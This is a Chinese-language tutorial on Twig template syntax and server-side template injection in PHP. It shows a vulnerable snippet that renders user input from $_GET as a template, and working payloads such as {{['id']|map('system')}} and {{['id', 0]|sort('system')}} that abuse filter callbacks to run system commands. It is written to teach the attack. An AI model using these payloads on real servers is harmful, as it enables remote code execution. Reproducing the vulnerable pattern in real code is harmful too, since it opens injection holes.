---
tags:
    - PHP
    - Web Sec
comments: true
---
# Twig 模板注入

> Twig is a modern template engine for PHP<br/>
> Fast: Twig compiles templates down to plain optimized PHP code. The overhead compared to regular PHP code was reduced to the very minimum.<br/>
> Secure: Twig has a sandbox mode to evaluate untrusted template code. This allows Twig to be used as a template language for applications where users may modify the template design.<br/>
> Flexible: Twig is powered by a flexible lexer and parser. This allows the developer to define its own custom tags and filters, and create its own DSL.<br/>

## 基础语法

模板实际就是一个常规的文本文件，它可以生成任何基于文本的格式（HTML、XML、CSV、LaTeX等）。它没有特定的扩展名。

模板包含变量或表达，在评估编译模板时，这些带值的变量或表达式会被替换。还有一些控制模板逻辑的标签 tags。

???+ example

    ```html
    <!DOCTYPE html>
    <html>
        <head>
            <title>My Webpage</title>
        </head>
        <body>
            <ul id="navigation">
            {% for item in navigation %}
                <li><a href="{{ item.href }}">{{ item.caption }}</a></li>
            {% endfor %}
            </ul>

            <h1>My Webpage</h1>
            {{ a_variable }}
        </body>
    </html>
    ```
有两种形式的分隔符：`{% ... %}` 和 `{{ ... }}`。前者用于执行语句，例如 for 循环，后者用于将表达式的结果输出到模板中。

twig可以通过**过滤器** filters 来修改模板中的变量。在过滤器中，变量与过滤器或多个过滤器之间使用 | 分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。

???+ example

    ```html
    {{ name|striptags|title }}

    // {{ '<a>whoami<a>'|striptags|title }}
    // Output: Whoami!
    ```

上例会剥去字符串变量 name 中的 HTML 标签，然后将其转化为大写字母开头的格式。

???+ example

    ```php
    <?php
    　　require_once dirname(__FILE__).'\twig\lib\Twig\Autoloader.php';
    　　Twig_Autoloader::register(true);
    　　$twig = new Twig_Environment(new Twig_Loader_String());
    　　$output = $twig->render("Hello {{name}}", array("name" => $_GET["name"]));  // 将用户输入作为模版变量的值
    　　echo $output;
    ?>
    ```

Twig使用一个加载器 `loader(Twig_Loader_Array)` 来定位模板，以及一个环境变量 Twig_Environment 来存储配置信息。

其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。

使用 Twig 模版引擎渲染页面，其中模版含有 `{{name}}`  变量，其模版变量值来自于GET请求参数`$_GET["name"]` 。

显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:

具体语法内容参考[twig官方文档](https://twig.symfony.com/doc/3.x/){target="_blank"}

## Twig 模板注入

和其他的模板注入一样，Twig 模板注入也是发生在直接将用户输入作为模板，比如下面的代码：

???+ example

    ```php
    <?php
    require_once __DIR__.'/vendor/autoload.php';

    $loader = new \Twig\Loader\ArrayLoader();
    $twig = new \Twig\Environment($loader);

    $template = $twig->createTemplate("Hello {$_GET['name']}!");

    echo $template->render();
    ?>
    ```

### 使用 map 过滤器

在 Twig 3.x 中，map 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：
???+ Example

    ```
    {{["Mark"]|map((arg)=>"Hello #{arg}!")}}
    ```
    Twig 3.x 会将其编译成：
    ```
    twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))})
    ```

    ```php
    <?php function twig_array_map($array, $arrow)
    {
        $r = [];
        foreach ($array as $k => $v) {
            $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
        }

        return $r;
    }?>
    ```
    如果控制了 $array 和 $arrow，那么就可以执行任意代码。例如传入```{{["id"]|map("system")}}```

### 使用 sort 过滤器
sort 筛选器可以用来对数组排序
???+ example

    ```html
    {% set fruits = [
        { name: 'Apples', quantity: 5 },
        { name: 'Oranges', quantity: 2 },
        { name: 'Grapes', quantity: 4 },
    ] %}

    {% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
        {{ fruit }}
    {% endfor %}

    // Output in this order: Oranges, Grapes, Apples
    ```

类似于 map，模板编译的过程中会进入 twig_sort_filter 函数，其中uasort函数会调用用户传入的比较函数，如果控制了比较函数，就可以执行任意代码。
```{{["id", 0]|sort("system")}}```

大部分使用arrow的过滤器都可以用来执行任意代码，其余 payload 参考[TWIG 全版本通用 SSTI payloads](https://xz.aliyun.com/t/7518){target="_blank"}
